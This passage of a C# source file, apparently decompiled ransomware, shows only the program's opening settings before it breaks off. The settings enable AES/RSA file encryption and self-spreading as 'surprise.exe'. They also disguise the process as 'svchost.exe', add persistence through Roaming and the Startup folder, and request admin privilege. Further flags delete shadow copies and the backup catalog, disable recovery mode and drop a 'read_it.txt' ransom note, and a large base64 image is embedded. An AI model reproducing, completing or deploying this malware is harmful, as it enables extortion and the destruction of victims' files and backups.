using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static readonly byte[] _salt = new byte[32];

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "v45hchdrg72ns7m6jmy";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "oAnWieozQPsRK7Bj83r4";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = true;

	private static int sleepTextbox = 10;

	private static string base64Image = "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igAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigArctvGviOyto7e21q+ihiUIiJMQFA6AVh0UAWtQ1G71S7e7v7iS4uHxukkbcxwMDn6ACqtFFADkcxurqSGU5BHat//AIT/AMU/9B/UP+/5rnqKAN+bxv4luIZIZtcv3jkUo6tMcMDwQfwrAoooA0tK8Q6toaSLpeoXNospBcQyFd2OmcfU1f8A+E/8U/8AQf1D/v8AmueooA6H/hP/ABT/ANB/UP8Av+awGZnYsxJYnJJ702igAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigC7pEMdxrNlDMu6OW4jRlz1BYA19H/wDCqPB3/QGT/v8ASf8AxVfOWhf8jDpv/X1F/wChCvrygD4/1SJINWvIYl2xxzOqrnoAxAr3PwR8OfDGreDNLvr7SlluZ4d0jmVxuOT6NXh2s/8AIcv/APr4k/8AQjX0x8Nv+Sd6L/17j+ZoA+dPGFlb6Z4v1Wzs4xFbwXLpGgJO1QenNYtdD4//AOR+1z/r8k/nWHbwPc3EcESlpJGCKB3JOBQB7P8ADH4caLq/g+PUdcsBcTXMrNGTI67UHyj7pHcE/jWD8YPBGneGf7OvNGtRb2026KVQzN845B5J6jP5V7dpFhFomh2dipVY7WFY9xOM4GM/if51z3xT0f8AtnwDqCKu6W2AuUwP7nJ/8d3UAePfCXS9I1zxPNp2tWaXKS27NEGYrhlIJ6Eds/lXpni/4Y+HLfwjqk+maVHDeQ27Sxusjkgr83c9wCPxrxrwFqf9keOdIui21BcKjn/Zf5T+jV9TTxJcQSQyDKSKUYex4oA+OK+gPA/w18PXfgzS7nVNMSe7nh813Z3BIY5HAI6KQK8Nn0yWLXJNMAPnLcG3A/2t23+dfW1lbLZWNvax/cgjWNfoBgfyoA8B+Kei6LovirTtM0ixS2Ty1ecIzHcWbAHJ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";

	public static string appMutexStartup = "1qrx0frdqdur0lllc6ezm";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

